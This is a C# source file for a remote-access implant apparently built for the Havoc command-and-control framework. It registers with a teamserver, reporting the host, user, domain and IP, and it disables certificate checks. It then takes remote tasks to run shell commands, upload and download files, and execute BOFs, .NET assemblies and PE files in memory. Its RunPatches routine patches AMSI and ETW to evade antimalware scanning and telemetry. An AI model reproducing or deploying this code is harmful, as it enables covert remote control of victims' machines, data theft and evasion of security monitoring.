using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.Collections;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Management;
using HavocImplant.AgentFunctions.BofExec;
using HavocImplant.AgentFunctions.BofExec.Internals;
using HavocImplant.NativeUtils;
using static HavocImplant.Implant;

namespace HavocImplant
{
    // The Core Class for the implant. Without AgentFunctions/, it can only exit and communicate with the server.
    public class Implant
    {
        // Altered by build
        string[] url = Config.url;
        public int sleepTime = Config.sleepTime;
        int timeout = Config.timeout;
        public int maxTries = Config.maxTries;
        public bool secure = Config.secure;

        // Communication with Teamserver
        byte[] agentId;
        byte[] magic;
        bool registered;
        int timeoutCounter = 0;
        public Dictionary<int, task> taskingInformation = new Dictionary<int, task>();
        public struct task
        {
            public string taskCommand;
            public string taskOutput;
            public task(string taskCommand, string taskOutput)
            {
                this.taskCommand = taskCommand;
                this.taskOutput = taskOutput;
            }
        }

        // Registration Properties
        string hostname = Dns.GetHostName();
        string userName = Environment.UserName;
        string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
        string IP = getIPv4();
        string PID = Process.GetCurrentProcess().Id.ToString();
        string PPID = "ppid here";
        string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
        string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
        string processName = Process.GetCurrentProcess().ProcessName;
        string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");

        // Locking resource related stuff
        static readonly object pe_lock = new object();
        static void Main(string[] args) // Looping through tasks and stuff
        {
            Implant implant = new Implant();
            Random rand = new Random();
            if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            while (!implant.registered) implant.Register();

            Console.WriteLine($"Implant will disconnect after {implant.maxTries} fails");
            Console.WriteLine($"Implant will consider {implant.timeout / 1000} as the timeout");

            RunPatches();

            while (true)
            {
                Console.WriteLine($"Failed Checkins: {implant.timeoutCounter}");
                byte[] rawTasks = implant.CheckIn("", "gettask");

                // Chunk of 4 = size = there is a task that is being sent to implant
                if (rawTasks.Length > 4)
                {
                    int offset = 0;
                    string task = "";

                    // Parsing the raw request from teamserver, splitting task into dictionary entries
                    while (offset < rawTasks.Length)
                    {
                        //byte[] stringAsBytes = Encoding.UTF8.GetBytes(rawTasks);

                        //int size = BitConverter.ToInt32(new List<byte>(stringAsBytes).GetRange(0, 4).ToArray(), 0); // [4 bytes containing size of task][task]
                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0); // [4 bytes containing size of task][task]
                        Console.WriteLine($"Task is of size {size}");

                        string dirtyTask = Encoding.UTF8.GetString(rawTasks, offset + 4, size); // Clear up the funky
                        List<byte> dirtyArray = Encoding.UTF8.GetBytes(dirtyTask).ToList<byte>();
                        dirtyArray.RemoveAll(item => item == 0x00);

                        task = Encoding.UTF8.GetString(dirtyArray.ToArray());
                        Console.WriteLine($"Task is {task}");

                        offset += size + 4;

                        int taskId = rand.Next(10000 * 10000);
                        implant.taskingInformation.Add(taskId, new Implant.task(task, ""));
                        Console.WriteLine("Task has id {0}", taskId);

                    }

                    Console.WriteLine("Task Queue length: {0}", implant.taskingInformation.Count);

                    // Parsing the commands from the dictionary
                    for (int i = 0; i < implant.taskingInformation.Count; i++)
                    {
                        string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;

                        int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                        Console.WriteLine("The ID is: {0}", taskId);

                        switch (command.Split(' ')[0])
                        {
                            case "shell":
                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
                                shellThread.Start();
                                break;
                            case "goodbye":
                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
                            case "sleep":
                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
                                sleepThread.Start();
                                break;
                            case "ls":
                                Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
                                lsThread.Start();
                                break;
                            case "upload":
                                Thread uploadThread = new Thread(() => AgentFunctions.Upload.Run(implant, command.Substring(6).Trim(), taskId));
                                uploadThread.Start();
                                break;
                            case "download":
                                Thread downloadThread = new Thread(() => AgentFunctions.Download.Run(implant, command.Substring(8).Trim(), taskId));
                                downloadThread.Start();
                                break;
                            case "bofexec":
                                /*
                                List<string> bofArgs = command.Substring(7).Trim().Split(';').ToList<string>();
                                List<string> bof = new List<string>();
                                if (bofArgs.Count > 2)
                                {
                                    bof.Add(bofArgs[bofArgs.Count-1]);
                                    bofArgs.RemoveAt(bofArgs.Count-1);
                                }
                                
                                Console.WriteLine($"bofArgs count: {bofArgs.Count}");
                                for (int ii = 0; ii < bofArgs.Count; ii++)
                                {
                                    Console.WriteLine($"Arg {ii} is: {bofArgs[ii]}");
                                }
                                */
                                string[] bofArgs = new string[] { command.Substring(7).Trim() };
                                Thread bofExecThread = new Thread(() => AgentFunctions.BofExec.BofExec.Run(implant, bofArgs, taskId));
                                bofExecThread.Start();
                                break;
                                
                            case "inline_assembly":
                                Thread inlineAssemblyThread = new Thread(() => AgentFunctions.InlineAssembly.Run(implant, command.Substring(15).Trim(), taskId));
                                inlineAssemblyThread.Start();
                                break;
                                
                            case "inline_pe":
                                lock (pe_lock)
                                {
                                    Thread inlinePEThread = new Thread(() => AgentFunctions.InlinePE.Run(implant, command.Substring(9).Trim(), taskId));
                                    inlinePEThread.Start();
                                    break;
                                }
                        }
                    }
                }
                Thread.Sleep(implant.sleepTime);
                string cumalativeOutput = "";

                for (int i = 0; i < implant.taskingInformation.Count; i++)
                {
                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                    if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
                    {
                        Console.WriteLine($"Shipping off Task ID {taskId}");
                        cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
                        implant.taskingInformation.Remove(taskId);
                    }
                    i--;
                }
                implant.CheckIn(cumalativeOutput, "commandoutput");
            }
        }
        public void Register()
        {
            magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
            agentId = Encoding.ASCII.GetBytes(random_id().ToString());

            string registrationRequestBody = obtainRegisterDict(Int32.Parse(Encoding.ASCII.GetString(agentId)));
            byte[] agentHeader = createHeader(magic, registrationRequestBody);

            string response = "";
            while (!response.Equals("registered"))
            {
                Console.WriteLine("Trying to register");
                response = Encoding.UTF8.GetString(sendReq(registrationRequestBody, agentHeader));
                Console.WriteLine("Response: {0}", response);
                Thread.Sleep(sleepTime);
            }
            registered = true;
        }
        public byte[] CheckIn(string data, string checkInType)
        {

            string checkInRequestBody = "{\"task\": \"{1}\", \"data\": \"{0}\"}".Replace("{1}", checkInType).Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
            byte[] agentHeader = createHeader(magic, checkInRequestBody);
            byte[] response = sendReq(checkInRequestBody, agentHeader);
            return response;

        }
        public byte[] createHeader(byte[] magic, string requestBody)
        {
            int size = requestBody.Length + 12;
            byte[] size_bytes = new byte[4] { 0x00, 0x00, 0x00, 0x00 };
            if (BitConverter.IsLittleEndian)
            {
                Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
                Array.Reverse(size_bytes);
            }
            Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
            byte[] agentHeader = new byte[size_bytes.Length + magic.Length + agentId.Length];
            Array.Copy(size_bytes, 0, agentHeader, 0, size_bytes.Length);
            Array.Copy(magic, 0, agentHeader, size_bytes.Length, magic.Length);
            Array.Copy(agentId, 0, agentHeader, size_bytes.Length + magic.Length, agentId.Length);
            return agentHeader;
        }
        int random_id()
        {
            Random rand = new Random();
            int id = rand.Next(1000, 10000);
            return id;
        }
        string obtainRegisterDict(int id)
        {
            Dictionary<string, string> registrationAttrs = new Dictionary<string, string>();
            registrationAttrs.Add("AgentID", id.ToString());
            registrationAttrs.Add("Hostname", hostname);
            registrationAttrs.Add("Username", userName);
            registrationAttrs.Add("Domain", domainName);
            registrationAttrs.Add("InternalIP", IP);
            registrationAttrs.Add("Process Path", "process path here");
            registrationAttrs.Add("Process ID", PID);
            registrationAttrs.Add("Process Parent ID", PPID);
            registrationAttrs.Add("Process Arch", "x64");
            registrationAttrs.Add("Process Elevated", "elevated status here");
            registrationAttrs.Add("OS Build", osBuild);
            registrationAttrs.Add("OS Arch", osArch);
            registrationAttrs.Add("Sleep", (sleepTime / 1000).ToString());
            registrationAttrs.Add("Process Name", processName);
            registrationAttrs.Add("OS Version", osVersion);
            string strRegistrationAttrsAsJSON = stringDictionaryToJson(registrationAttrs);
            string strPostReq = "{\"task\": \"register\", \"data\": \"{0}\"}".Replace("{0}", strRegistrationAttrsAsJSON);
            return strPostReq;
        }
        public static string stringDictionaryToJson(Dictionary<string, string> dict)
        {
            var entries = dict.Select(d =>
                string.Format("\\\"{0}\\\": \\\"{1}\\\"", d.Key, string.Join(",", d.Value)));
            return "{" + string.Join(",", entries) + "}";
        }
        public byte[] sendReq(string requestBody, byte[] agentHeader)
        {
            bool AcceptAllCertifications(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certification, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
            {
                return true;
            }
            Random rand = new Random();
            //string responseString = "";
            byte[] responseBytes = new byte[] { };
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

            var request = (HttpWebRequest)WebRequest.Create(url[rand.Next(0, url.Length)]);

            ArrayList arrayList = new ArrayList();
            arrayList.AddRange(agentHeader);

            string postData = requestBody;
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            arrayList.AddRange(postBytes);
            byte[] data = (byte[])arrayList.ToArray(typeof(byte));

            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            request.Timeout = timeout;
            try
            {
                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();

                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    using (var memoryStream = new MemoryStream())
                    {
                        response.GetResponseStream().CopyTo(memoryStream);
                        responseBytes = memoryStream.ToArray();
                    }
                }
                if (responseBytes.Length > 0)
                {
                    timeoutCounter = 0;
                }
                Console.WriteLine("Setting counter to 0");
                timeoutCounter = 0;
            }
            catch (WebException ex)
            {
                if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                {
                    var response = (HttpWebResponse)ex.Response;
                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            response.GetResponseStream().CopyTo(memoryStream);
                            responseBytes = memoryStream.ToArray();
                        }
                    }
                }
                if (ex.Status == WebExceptionStatus.Timeout || ex.Status == WebExceptionStatus.ConnectFailure)
                {
                    timeoutCounter += 1;
                    if (timeoutCounter == maxTries) Environment.Exit(Environment.ExitCode);
                }
                Console.WriteLine($"status code: {ex.Status}");
            }

            return responseBytes;
        }
        static string getIPv4()
        {
            foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return a.ToString();
            return "";

        }
        public static string HKLM_GetString(string path, string key)
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
            if (rk == null) return "";
            return (string)rk.GetValue(key);
        }
        public static void RunPatches()
        {
            // Amsi
            byte[] patch = new byte[6];
            patch[0] = 0xB8;
            patch[1] = 0x57;
            patch[2] = 0x00;
            patch[3] = 0x07;
            patch[4] = 0x80;
            patch[5] = 0xc3;
            IntPtr pAmsi = (IntPtr)globalDll.kernel32.dynamicExecute<Delegates.LoadLibraryA>("LoadLibraryA", new object[] {"amsi.dll"});
            Console.WriteLine("Amsi at 0x{0:X}", pAmsi);
            dll amsi = new dll("amsi.dll");
            IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_READWRITE, (uint)0 });
            GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory",  new object[] { (IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, (uint)0});
            hPatch.Free();
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
            // ETW
            IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, (uint)0 });
            Marshal.WriteByte(pNtTraceEvent, 0xc3);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
            
        }
    }
}